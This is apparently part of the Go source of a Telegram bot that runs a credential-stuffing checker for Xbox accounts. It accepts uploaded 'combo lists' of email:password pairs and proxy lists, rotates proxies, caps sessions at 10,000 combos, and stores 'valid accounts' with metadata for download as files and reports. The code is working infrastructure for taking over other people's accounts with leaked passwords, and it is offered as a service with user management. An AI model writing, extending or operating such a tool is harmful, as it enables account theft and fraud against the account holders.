		text = fmt.Sprintf("✅ **Xbox Account Check Completed**\n\n"+
			"📊 **Final Results:**\n"+
			"✅ **Valid Accounts:** %d\n"+
			"❌ **Invalid Accounts:** %d\n"+
			"⚠️ **Errors:** %d\n"+
			"📈 **Success Rate:** %.1f%%\n"+
			"⏱️ **Total Time:** %s\n\n"+
			"📁 **Download your results below:**",
			stats.Valid, stats.Invalid, stats.Errors,
			float64(stats.Valid)/float64(stats.Total)*100,
			stats.ElapsedTime.Round(time.Second))
	}

	var keyboard tgbotapi.InlineKeyboardMarkup
	if hasUnchecked {
		keyboard = tgbotapi.NewInlineKeyboardMarkup(
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("📥 Download Valid", fmt.Sprintf("download_valid_%s", sessionID)),
				tgbotapi.NewInlineKeyboardButtonData("📥 Download Invalid", fmt.Sprintf("download_invalid_%s", sessionID)),
			),
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("📊 Full Report", fmt.Sprintf("download_report_%s", sessionID)),
				tgbotapi.NewInlineKeyboardButtonData("📋 Unchecked", fmt.Sprintf("download_unchecked_%s", sessionID)),
			),
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("🔄 Check More", "check_menu"),
				tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", "main_menu"),
			),
		)
	} else {
		keyboard = tgbotapi.NewInlineKeyboardMarkup(
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("📥 Download Valid", fmt.Sprintf("download_valid_%s", sessionID)),
				tgbotapi.NewInlineKeyboardButtonData("📥 Download Invalid", fmt.Sprintf("download_invalid_%s", sessionID)),
			),
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("📊 Full Report", fmt.Sprintf("download_report_%s", sessionID)),
			),
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("🔄 Check More", "check_menu"),
				tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", "main_menu"),
			),
		)
	}

	editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editMsg.ParseMode = "Markdown"
	editMsg.ReplyMarkup = &keyboard
	b.api.Send(editMsg)

	// Update user statistics
	b.userManager.UpdateCheckStats(userID, stats.Valid, stats.Invalid)
}

func (b *Bot) handleProxyFileUpload(update tgbotapi.Update) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	document := update.Message.Document

	// Clear user state
	delete(b.userStates, chatID)

	// Check file size (max 5MB for proxy files)
	if document.FileSize > 5*1024*1024 {
		msg := tgbotapi.NewMessage(chatID, "❌ Proxy file too large. Maximum size is 5MB.")
		b.api.Send(msg)
		return
	}

	// Get user to check if banned
	user, err := b.userManager.GetUser(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error getting user information.")
		b.api.Send(msg)
		return
	}

	if user.IsBanned {
		msg := tgbotapi.NewMessage(chatID, "❌ You have been banned from using this bot.")
		b.api.Send(msg)
		return
	}

	// Send processing message
	processingMsg := tgbotapi.NewMessage(chatID, "📥 Processing your proxy file...")
	sentMsg, _ := b.api.Send(processingMsg)

	// Download the file
	fileURL, err := b.api.GetFileDirectURL(document.FileID)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ Error downloading file.")
		b.api.Send(editMsg)
		return
	}

	// Download and parse proxy file
	proxyData, err := b.downloadProxyFile(fileURL)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ Error downloading proxy file: "+err.Error())
		b.api.Send(editMsg)
		return
	}

	// Get proxy limit from admin settings
	proxyLimit := b.adminManager.GetSettings().GlobalProxyLimit
	if proxyLimit == 0 {
		proxyLimit = 5 // Default to 5 if not set
	}

	// Parse and add proxies with limit
	err = b.proxyManager.ParseProxyListWithLimit(userID, proxyData, proxyLimit)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ "+err.Error())
		b.api.Send(editMsg)
		return
	}

	// Get proxy stats to show results
	stats, err := b.proxyManager.GetProxyStats(userID)
	if err != nil {
		stats = map[string]int{"total": 0, "working": 0, "active": 0}
	}

	successText := fmt.Sprintf("✅ **Proxy file processed successfully!**\n\n📊 **Your Proxy Stats:**\nTotal: %d/%d\nActive: %d\n\n🔄 Proxies will be automatically checked every 5 minutes.", stats["total"], proxyLimit, stats["active"])

	editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, successText)
	editMsg.ParseMode = "Markdown"
	b.api.Send(editMsg)

	// Show proxy menu
	b.showProxyMenu(chatID, userID)
}

func (b *Bot) downloadProxyFile(fileURL string) (string, error) {
	resp, err := http.Get(fileURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	scanner := bufio.NewScanner(resp.Body)
	var proxyData strings.Builder

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxyData.WriteString(line + "\n")
		}
	}

	if err := scanner.Err(); err != nil {
		return "", err
	}

	return proxyData.String(), nil
}

func (b *Bot) handleProxyTextUpload(update tgbotapi.Update) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	text := strings.TrimSpace(update.Message.Text)

	// Clear user state
	delete(b.userStates, chatID)

	// Get user to check if banned
	user, err := b.userManager.GetUser(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error getting user information.")
		b.api.Send(msg)
		return
	}

	if user.IsBanned {
		msg := tgbotapi.NewMessage(chatID, "❌ You have been banned from using this bot.")
		b.api.Send(msg)
		return
	}

	// Send processing message
	processingMsg := tgbotapi.NewMessage(chatID, "📥 Processing your proxy list...")
	sentMsg, _ := b.api.Send(processingMsg)

	// Get proxy limit from admin settings
	proxyLimit := b.adminManager.GetSettings().GlobalProxyLimit
	if proxyLimit == 0 {
		proxyLimit = 5 // Default to 5 if not set
	}

	// Parse and add proxies with limit
	err = b.proxyManager.ParseProxyListWithLimit(userID, text, proxyLimit)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ "+err.Error())
		b.api.Send(editMsg)
		return
	}

	// Get proxy stats to show results
	stats, err := b.proxyManager.GetProxyStats(userID)
	if err != nil {
		stats = map[string]int{"total": 0, "working": 0, "active": 0}
	}

	successText := fmt.Sprintf("✅ **Proxy list processed successfully!**\n\n📊 **Your Proxy Stats:**\nTotal: %d/%d\nActive: %d\n\n🔄 Proxies will be automatically checked every 5 minutes.", stats["total"], proxyLimit, stats["active"])

	editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, successText)
	editMsg.ParseMode = "Markdown"
	b.api.Send(editMsg)

	// Show proxy menu
	b.showProxyMenu(chatID, userID)
}

func (b *Bot) handleComboTextUpload(update tgbotapi.Update) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	text := strings.TrimSpace(update.Message.Text)

	// Clear user state
	delete(b.userStates, chatID)

	// Get user to check if banned
	user, err := b.userManager.GetUser(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error getting user information.")
		b.api.Send(msg)
		return
	}

	if user.IsBanned {
		msg := tgbotapi.NewMessage(chatID, "❌ You have been banned from using this bot.")
		b.api.Send(msg)
		return
	}

	// Send processing message
	processingMsg := tgbotapi.NewMessage(chatID, "📥 Processing your combo list...")
	sentMsg, _ := b.api.Send(processingMsg)

	// Parse combos from text
	combos, err := b.parseCombosFromText(text)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ Error parsing combo list: "+err.Error())
		b.api.Send(editMsg)
		return
	}

	if len(combos) == 0 {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No valid combos found in the text. Please use format: email:password")
		b.api.Send(editMsg)
		return
	}

	var uncheckedCombos []string
	if len(combos) > 10000 {
		// Split combos: first 10k for checking, rest as unchecked
		uncheckedCombos = combos[10000:]
		combos = combos[:10000]
	}

	// Update processing message
	totalCombos := len(combos) + len(uncheckedCombos)
	var messageText string
	if len(uncheckedCombos) > 0 {
		messageText = fmt.Sprintf("✅ *Combo list processed successfully!*\n\n📊 *Found %d valid combos*\n🔄 *Will check first 10,000*\n📋 *%d will remain unchecked*\n\nReady to start checking?", totalCombos, len(uncheckedCombos))
	} else {
		messageText = fmt.Sprintf("✅ *Combo list processed successfully!*\n\n📊 *Found %d valid combos*\n\nReady to start checking?", len(combos))
	}

	// Start checking process
	sessionID := fmt.Sprintf("%d_%d", userID, time.Now().Unix())
	b.userSessions[sessionID] = &CheckSession{
		UserID:          userID,
		SessionID:       sessionID,
		Combos:          combos,
		UncheckedCombos: uncheckedCombos,
		StartTime:       time.Now(),
		Status:          "ready",
		TotalCombos:     totalCombos,
	}

	// Show start checking button
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🚀 Start Checking", "start_check_"+sessionID),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", "main_menu"),
		),
	)

	// Edit the processing message to show success with start button
	b.editMessage(chatID, sentMsg.MessageID, messageText, &keyboard)
}

func (b *Bot) parseCombosFromText(text string) ([]string, error) {
	lines := strings.Split(text, "\n")
	var combos []string
	
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		
		// Check if line contains email:password format
		if strings.Contains(line, ":") && strings.Contains(line, "@") {
			combos = append(combos, line)
		}
	}
	
	return combos, nil
}

func (b *Bot) handleCheckerDownload(callback *tgbotapi.CallbackQuery, downloadType, sessionID string) {
	userID := callback.From.ID
	chatID := callback.Message.Chat.ID

	// Send processing message
	processingMsg := tgbotapi.NewMessage(chatID, "📥 Preparing your download...")
	sentMsg, _ := b.api.Send(processingMsg)

	var fileContent string
	var fileName string

	switch downloadType {
	case "unchecked":
		// Get unchecked combos
		uncheckedKey := fmt.Sprintf("unchecked_%s", sessionID)
		query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
		err := b.db.DataDB.QueryRow(query, uncheckedKey, userID).Scan(&fileContent)
		if err != nil {
			editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No unchecked combos found for this session.")
			b.api.Send(editMsg)
			return
		}
		fileName = fmt.Sprintf("unchecked_combos_%s.txt", sessionID)

	case "valid":
		// Get valid results from database
		validKey := fmt.Sprintf("valid_%s", sessionID)
		log.Printf("Looking for valid results with key: %s for user: %d", validKey, userID)
		query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
		err := b.db.DataDB.QueryRow(query, validKey, userID).Scan(&fileContent)
		if err != nil {
			log.Printf("Error retrieving valid results: %v", err)
			editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No valid accounts found for this session.")
			b.api.Send(editMsg)
			return
		}
		log.Printf("Found valid results, content length: %d", len(fileContent))
		fileName = fmt.Sprintf("valid_accounts_%s.txt", sessionID)

	case "invalid":
		// Get invalid results from database
		invalidKey := fmt.Sprintf("invalid_%s", sessionID)
		log.Printf("Looking for invalid results with key: %s for user: %d", invalidKey, userID)
		query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
		err := b.db.DataDB.QueryRow(query, invalidKey, userID).Scan(&fileContent)
		if err != nil {
			log.Printf("Error retrieving invalid results: %v", err)
			editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No invalid accounts found for this session.")
			b.api.Send(editMsg)
			return
		}
		log.Printf("Found invalid results, content length: %d", len(fileContent))
		fileName = fmt.Sprintf("invalid_accounts_%s.txt", sessionID)

	case "report":
		// Generate full report from stored data
		reportKey := fmt.Sprintf("report_%s", sessionID)
		var reportData string
		query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
		err := b.db.DataDB.QueryRow(query, reportKey, userID).Scan(&reportData)
		if err != nil {
			editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No report data found for this session.")
			b.api.Send(editMsg)
			return
		}
		
		// Parse stored report data
		lines := strings.Split(reportData, "\n")
		var reportLines []string
		reportLines = append(reportLines, "Xbox Account Check Report")
		reportLines = append(reportLines, "=========================")
		reportLines = append(reportLines, fmt.Sprintf("Session ID: %s", sessionID))
		reportLines = append(reportLines, fmt.Sprintf("Generated: %s", time.Now().Format("2006-01-02 15:04:05")))
		reportLines = append(reportLines, "")
		reportLines = append(reportLines, "VALID ACCOUNTS:")
		reportLines = append(reportLines, "---------------")
		
		validCount := 0
		invalidCount := 0
		var validAccounts []string
		var invalidAccounts []string
		
		for _, line := range lines {
			if line == "" {
				continue
			}
			parts := strings.Split(line, "|")
			if len(parts) == 2 {
				combo := parts[0]
				status := parts[1]
				if status == "VALID" {
					validAccounts = append(validAccounts, combo)
					validCount++
				} else {
					invalidAccounts = append(invalidAccounts, combo)
					invalidCount++
				}
			}
		}
		
		for _, combo := range validAccounts {
			reportLines = append(reportLines, combo)
		}
		
		reportLines = append(reportLines, "")
		reportLines = append(reportLines, "INVALID ACCOUNTS:")
		reportLines = append(reportLines, "-----------------")
		
		for _, combo := range invalidAccounts {
			reportLines = append(reportLines, combo)
		}
		
		reportLines = append(reportLines, "")
		reportLines = append(reportLines, "SUMMARY:")
		reportLines = append(reportLines, "--------")
		totalChecked := validCount + invalidCount
		reportLines = append(reportLines, fmt.Sprintf("Total Checked: %d", totalChecked))
		reportLines = append(reportLines, fmt.Sprintf("Valid: %d", validCount))
		reportLines = append(reportLines, fmt.Sprintf("Invalid: %d", invalidCount))
		if totalChecked > 0 {
			reportLines = append(reportLines, fmt.Sprintf("Success Rate: %.1f%%", float64(validCount)/float64(totalChecked)*100))
		}
		
		fileContent = strings.Join(reportLines, "\n")
		fileName = fmt.Sprintf("full_report_%s.txt", sessionID)
	}

	if fileContent == "" {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No data available for download.")
		b.api.Send(editMsg)
		return
	}

	// Create and send file
	fileBytes := []byte(fileContent)
	fileReader := tgbotapi.FileBytes{
		Name:  fileName,
		Bytes: fileBytes,
	}

	document := tgbotapi.NewDocument(chatID, fileReader)
	document.Caption = fmt.Sprintf("📁 %s\n\n📊 Size: %d lines\n⏰ Generated: %s", 
		fileName, len(strings.Split(fileContent, "\n")), time.Now().Format("15:04:05"))

	// Delete processing message
	deleteMsg := tgbotapi.NewDeleteMessage(chatID, sentMsg.MessageID)
	b.api.Send(deleteMsg)

	// Send file
	_, err := b.api.Send(document)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error sending file: "+err.Error())
		b.api.Send(msg)
		return
	}

	// Send success message
	successMsg := tgbotapi.NewMessage(chatID, "✅ **Download completed successfully!**")
	successMsg.ParseMode = "Markdown"
	b.api.Send(successMsg)
}

// Store session results in database for persistent access
func (b *Bot) storeSessionResults(userID int64, botSessionID, checkerSessionID string) {
	log.Printf("Storing session results - UserID: %d, BotSessionID: %s, CheckerSessionID: %s", userID, botSessionID, checkerSessionID)
	
	// Get results from checker manager
	results, err := b.checkerManager.GetSessionResults(checkerSessionID, userID)
	if err != nil {
		log.Printf("Error getting session results for storage: %v", err)
		return
	}
	
	log.Printf("Retrieved %d results from checker manager", len(results))

	// Separate valid and invalid results - use FullResult which includes metadata
	var validResults []string
	var invalidCombos []string
	
	for _, result := range results {
		if result.IsValid {
			// Use FullResult which contains email:pass | metadata
			validResults = append(validResults, result.FullResult)
		} else {
			// For invalid, just store the combo
			invalidCombos = append(invalidCombos, result.Combo)
		}
	}

	// Store valid results with full metadata
	if len(validResults) > 0 {
		validData := strings.Join(validResults, "\n")
		validKey := fmt.Sprintf("valid_%s", botSessionID)
		query := `INSERT OR REPLACE INTO data (key, value, user_id) VALUES (?, ?, ?)`
		_, err := b.db.DataDB.Exec(query, validKey, validData, userID)
		if err != nil {
			log.Printf("Error storing valid results: %v", err)
		} else {
			log.Printf("Stored %d valid results with metadata, key: %s", len(validResults), validKey)
		}
	}

	// Store invalid results
	if len(invalidCombos) > 0 {
		invalidData := strings.Join(invalidCombos, "\n")
		invalidKey := fmt.Sprintf("invalid_%s", botSessionID)
		query := `INSERT OR REPLACE INTO data (key, value, user_id) VALUES (?, ?, ?)`
		_, err := b.db.DataDB.Exec(query, invalidKey, invalidData, userID)
		if err != nil {
			log.Printf("Error storing invalid results: %v", err)
		} else {
			log.Printf("Stored %d invalid combos with key: %s", len(invalidCombos), invalidKey)
		}
	}

	// Store full results for report generation - use FullResult for valid accounts
	var allResults []string
	for _, result := range results {
		if result.IsValid {
			// For valid accounts, include full metadata in report
			allResults = append(allResults, fmt.Sprintf("%s|VALID", result.FullResult))
		} else {
			allResults = append(allResults, fmt.Sprintf("%s|INVALID", result.Combo))
		}
	}
	
	if len(allResults) > 0 {
		reportData := strings.Join(allResults, "\n")
		reportKey := fmt.Sprintf("report_%s", botSessionID)
		query := `INSERT OR REPLACE INTO data (key, value, user_id) VALUES (?, ?, ?)`
		_, err := b.db.DataDB.Exec(query, reportKey, reportData, userID)
		if err != nil {
			log.Printf("Error storing report data: %v", err)
		} else {
			log.Printf("Stored report data with key: %s", reportKey)
		}
	}

	// Clean up tmp files after storing results in database
	b.cleanupSessionTmpFiles(userID, checkerSessionID)
}

// cleanupSessionTmpFiles removes temporary session files after results are stored in database
func (b *Bot) cleanupSessionTmpFiles(userID int64, checkerSessionID string) {
	// The checker session directory is: tmp/user_{userID}/sessions/{sessionID}
	sessionDir := filepath.Join("tmp", fmt.Sprintf("user_%d", userID), "sessions", checkerSessionID)
	
	// Check if directory exists
	if _, err := os.Stat(sessionDir); os.IsNotExist(err) {
		log.Printf("Session directory does not exist, nothing to clean: %s", sessionDir)
		return
	}
	
	// Remove the entire session directory
	err := os.RemoveAll(sessionDir)
	if err != nil {
		log.Printf("Error cleaning up session tmp files: %v", err)
	} else {
		log.Printf("Successfully cleaned up session tmp files: %s", sessionDir)
	}
	
	// Also clean up the checker manager's session from memory
	b.checkerManager.CleanupSession(checkerSessionID)
}
